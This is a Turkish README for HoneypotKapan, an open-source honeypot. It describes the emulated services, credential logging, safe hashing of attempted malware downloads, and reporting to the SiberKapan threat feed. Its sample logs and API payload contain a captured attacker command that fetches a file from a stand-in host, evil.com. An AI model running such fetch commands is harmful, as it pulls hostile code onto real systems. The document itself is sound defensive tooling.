# HoneypotKapan 🪤

**SiberKapan Tehdit İstihbarat Honeypotu**  
Turkey's Open-Source Cyber Threat Intelligence Honeypot

[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](../LICENSE)
[![Platform](https://img.shields.io/badge/Platform-Ubuntu%2020%2B-orange.svg)]()
[![SiberKapan](https://img.shields.io/badge/Powered%20by-SiberKapan-00e5ff.svg)](https://siberkapan.org)

HoneypotKapan, SiberKapan platformuyla entegre çalışan açık kaynak bir honeypot sistemidir. Saldırganları sahte servislerle tuzağa düşürür, credential'larını loglar, SSH üzerinden indirmeye çalıştıkları malware örneklerini güvenli şekilde hash'ler ve tespit edilen IP'leri SiberKapan topluluğuyla otomatik olarak paylaşır.

---

## Kurulum

```bash
wget https://siberkapan.org/honeypot/install.py
sudo python3 install.py
```

**Gereksinimler:**
- Ubuntu 20.04+ veya Debian 11+
- Python 3.8+
- Root yetkisi
- SiberKapan API anahtarı → [siberkapan.org/iletisim](https://siberkapan.org/iletisim)

---

## Nasıl Çalışır?

```
İnternet → Firewall (NAT) → HoneypotKapan Sunucu
                                      │
                              Sahte servis yanıtı
                              Credential loglama
                                      │
                       SSH'de: sahte shell + komut yakalama
                       (indirme denemesi varsa güvenli hash'leme)
                                      │
                    3. denemede — ya da bir malware örneği
                    yakalandığında ANINDA — SiberKapan API bildirimi
                                      │
                              Tüm topluluk korunur
```

---

## Desteklenen Servisler

| Servis | Honeypot Port | Gerçek Port | Ne Yakalar |
|--------|--------------|-------------|------------|
| SSH | 10022 | 22 | Username + Password + çalıştırılan komutlar |
| FTP | 10021 | 21 | Username + Password |
| Telnet | 10023 | 23 | Username + Password |
| RDP | 13389 | 3389 | Bağlantı + Username |
| SMB | 10445 | 445 | Bağlantı + Username |
| MSSQL | 11433 | 1433 | Username |
| MySQL | 13306 | 3306 | Username |
| VNC | 15900 | 5900 | Şifre hash'i |
| HTTP | 18080 | 8080 | Username + Password |
| SIP | 15060 | 5060 | SIP kullanıcı adı |
| **SMTP** | 10025 | 25 | Auth denemesi + open-relay denemesi |

---

## Malware Örnek Yakalama

SSH honeypot'u artık saldırganların "giriş yaptığını" düşünmesine izin veriyor (kimlik doğrulama her zaman başarılı sayılır — Cowrie gibi olgun honeypot projelerinin standart "medium-interaction" tasarımı) ve sahte bir komut satırı sunuyor. Saldırgan `wget`/`curl` ile bir dosya indirmeye çalışırsa:

1. İndirme URL'i yakalanır
2. Dosya **SSRF korumalı** şekilde çekilir — hedef IP çözülüp doğrulanır (private/loopback/link-local/cloud-metadata adresleri reddedilir), 5MB boyut ve 8 saniye zaman sınırı vardır
3. **Dosyanın kendisi hiçbir zaman diske yazılmaz veya çalıştırılmaz** — sadece SHA256 hash'i ve boyutu tutulur
4. Hash, [MalwareBazaar](https://bazaar.abuse.ch) veritabanına sorulup bilinen bir aileyle eşleşip eşleşmediği kontrol edilir

Yakalanan örnekler [siberkapan.org/malware-samples](https://siberkapan.org/malware-samples) adresinde herkese açık olarak listelenir.

Saldırgana gerçek bir shell veya dosya sistemi **asla** verilmez — tüm etkileşim simüle edilir.

---

## Firewall NAT Yapılandırması

Kurulum tamamlandığında ekranda gösterilir:

```
════════════════════════════════════════════════════════════
  Bu sunucunun ic IP adresi: 192.168.1.100
════════════════════════════════════════════════════════════
  Dis Port     Hedef                          Servis
  ──────────────────────────────────────────────────────────
  22           192.168.1.100:10022            SSH
  3389         192.168.1.100:13389            RDP
  25           192.168.1.100:10025            SMTP
  21           192.168.1.100:10021            FTP
  ...
════════════════════════════════════════════════════════════

  Saldırı alacak olan honeypot portlarını, iç sunucunuzda
  belirtilen portlara yönlendirin.
  Örneğin 22 için sunucunuzun 192.168.1.100:10022 gibi.
```

FortiGate, MikroTik, Palo Alto veya kullandığınız herhangi bir firewall'da bu NAT kurallarını oluşturun.

**Not (SMTP için):** Hem port 25 (MTA-to-MTA, open-relay taramaları) hem port 587 (submission, auth denemeleri) aynı honeypot portuna (10025) NAT'lanabilir — ikisi de aynı SMTP simülasyonunu tetikler ve farklı saldırgan davranışları yakalar.

---

## Log Dosyaları

```
/var/log/honeypotkapan/
├── honeypotkapan.log    # Servis logu
├── events.log           # Tüm olaylar (JSON)
└── credentials.log      # Yakalanan credential'lar (JSON)
```

**Örnek events.log:**
```json
{"timestamp":"2026-06-16T10:30:00Z","service":"ssh","ip":"1.2.3.4","port":10022,"username":"admin","password":"123456","extra":{}}
{"timestamp":"2026-08-02T18:40:13Z","service":"ssh","ip":"1.2.3.4","port":10022,"username":null,"password":null,"extra":{"command":"wget http://evil.com/x -O /tmp/x","download_url":"http://evil.com/x","sha256":"03ba204e...","size_bytes":45102,"truncated":false}}
{"timestamp":"2026-06-16T10:31:00Z","service":"http","ip":"1.2.3.4","port":18080,"username":"admin","password":"admin123","extra":{"method":"POST","path":"/login"}}
```

---

## Servis Yönetimi

```bash
# Durum
systemctl status honeypotkapan

# Başlat / Durdur / Yeniden başlat
systemctl start honeypotkapan
systemctl stop honeypotkapan
systemctl restart honeypotkapan

# Canlı log
journalctl -u honeypotkapan -f

# Olay logu
tail -f /var/log/honeypotkapan/events.log

# Sadece yakalanan komutları gör
grep '"command"' /var/log/honeypotkapan/events.log

# Sadece malware örneklerini gör (indirme + hash denemesi)
grep '"sha256"' /var/log/honeypotkapan/events.log
```

---

## SiberKapan Entegrasyonu

HoneypotKapan, bir IP **3 kez** bağlantı denemesi yaptığında — ya da bir malware örneği **anında** yakalandığında (eşik beklenmeden) — SiberKapan API'ye otomatik bildirim gönderir:

```
POST https://siberkapan.org/feed/honeypot
X-SiberKapan-Key: <api_key>

{
  "ip": "1.2.3.4",
  "attack_type": "honeypot_ssh",
  "port": 10022,
  "sensor": "HoneypotKapan",
  "username": "root",
  "password": "toor",
  "extra": {
    "command": "wget http://evil.com/x -O /tmp/x",
    "download_url": "http://evil.com/x",
    "sha256": "03ba204e50d126e4674c005e04d82e84c21366780af1f43bd54a37816b6ab340",
    "size_bytes": 45102
  }
}
```

Bildirilen IP'ler SiberKapan veritabanına eklenerek tüm toplulukla paylaşılır ve blocklist'e dahil edilir. Yakalanan malware örnekleri ayrıca [MalwareBazaar](https://bazaar.abuse.ch) ile zenginleştirilip [siberkapan.org/malware-samples](https://siberkapan.org/malware-samples) sayfasında listelenir.

---

## Lisans

MIT License — [siberkapan.org](https://siberkapan.org)
